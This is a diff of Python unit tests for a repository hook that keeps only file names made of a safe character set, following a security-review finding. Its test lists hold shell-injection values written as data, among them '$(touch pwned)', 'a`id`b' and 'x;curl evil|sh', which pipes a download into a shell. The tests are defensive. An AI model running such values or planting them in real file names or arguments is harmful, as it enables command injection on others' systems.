@@ -372,6 +372,41 @@ class Candidates(Repos):
         kept, dropped = self.hook.candidate_paths(bad)
         self.assertEqual(([], len(bad)), (kept, dropped))
 
+    SAFE_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._/+@%,-"
+    HOSTILE_NAMES = ("a;b", "$(touch pwned)", "`touch pwned`", "a b", "a|b", "a&b", "a>b", "a<b", "it's", 'a"b', "a\\b", "a*b", "a?b",
+                     "a!b", "a#b", "~x", "{a,b}", "=ls", "a=b", "a:b", "x;curl evil|sh", "has space;x", "$HOME", "(a)", "[a]", "^a",
+                     "a{b", "a}b", " lead", "trail ")
+
+    def test_every_character_of_the_safe_alphabet_is_accepted_inside_a_name(self):
+        for char in self.SAFE_ALPHABET:
+            name = "a%sb" % char
+            self.assertEqual(([name], 0), self.hook.candidate_paths([name]), name)
+
+    def test_every_other_printable_character_makes_the_name_a_non_candidate(self):
+        for code in range(0x20, 0x7F):
+            char = chr(code)
+            if char in self.SAFE_ALPHABET:
+                continue
+            name = "a%sb" % char
+            self.assertEqual(([], 1), self.hook.candidate_paths([name]), repr(name))
+
+    def test_the_hostile_names_of_the_review_are_not_candidates(self):
+        kept, dropped = self.hook.candidate_paths(list(self.HOSTILE_NAMES))
+        self.assertEqual(([], len(self.HOSTILE_NAMES)), (kept, dropped))
+
+    def test_a_name_that_starts_with_an_equals_sign_or_a_tilde_is_not_a_candidate(self):
+        self.assertEqual(([], 4), self.hook.candidate_paths(["=ls", "=", "~", "~root/x"]))
+
+    def test_a_trailing_newline_a_nul_and_non_ascii_letters_or_digits_are_not_in_the_alphabet(self):
+        """The class is spelled out and the match is whole: `$` would let a trailing newline through, `\\w` or `\\d` a Unicode letter or digit."""
+        names = ["a\n", "a\nb", "\n", "a\x00", "a\x00b", "\u00e9", "caf\u00e9", "\u0663", "a\u0663", "\u0661\u0662", "\u00aa", "\u2160", "a\u200bb",
+                 "\uff21", "a\u2028b", "a\r", "a\t"]
+        self.assertEqual(([], len(names)), self.hook.candidate_paths(names))
+
+    def test_the_alphabet_does_not_let_back_what_the_other_rules_keep_out(self):
+        bad = ["-x", "--option", "a//b", "./a", "a/./b", "../a", "a/..", "/a", "a/", ""]
+        self.assertEqual(([], len(bad)), self.hook.candidate_paths(bad))
+
     def test_a_path_of_exactly_256_printable_characters_is_a_candidate(self):
         path = "d/" + "x" * 254
         self.assertEqual(256, len(path))
@@ -531,6 +566,24 @@ class HandleRow(Base):
         facts = self.one_collected()["facts"]["facts"]
         self.assertEqual(([], 2), (facts["paths"], facts["paths_dropped"]))
         self.assertNotIn(token, self.stored_text())
+
+    def test_tracked_names_a_shell_would_read_as_syntax_are_left_out_and_counted(self):
+        """The Low 1 finding of the security review of 2026-11-07: a repository can track a file named like `$(touch pwned)` or
+        `has space;x` and commit a fake secret so that the engine declines it. The name must not reach the handle."""
+        hostile = ["has space;x", "$(touch pwned)", "x;curl evil|sh", "a`id`b", "=ls", "a=b", "it's"]
+        self.track("plain.txt", *hostile)
+        self.record_with({"paths": ["plain.txt"] + hostile})
+        facts = self.one_collected()["facts"]["facts"]
+        self.assertEqual((["plain.txt"], len(hostile)), (facts["paths"], facts["paths_dropped"]))
+        for text in hostile:
+            self.assertNotIn(text, self.stored_text())
+
+    def test_tracked_names_of_the_safe_alphabet_are_kept(self):
+        names = ["a+b", "a@b", "a%b", "a,b", "a_b", "a-b", "a.b", "Z9/y", "v1.2+3@4%5,6"]
+        self.track(*names)
+        self.record_with({"paths": names})
+        facts = self.one_collected()["facts"]["facts"]
+        self.assertEqual((names, 0), (facts["paths"], facts["paths_dropped"]))
 
     def test_a_tracked_path_is_kept_even_when_its_name_looks_like_a_token(self):
         """The residual risk the plan states: a secret that is already a tracked filename is already in the repository, and the
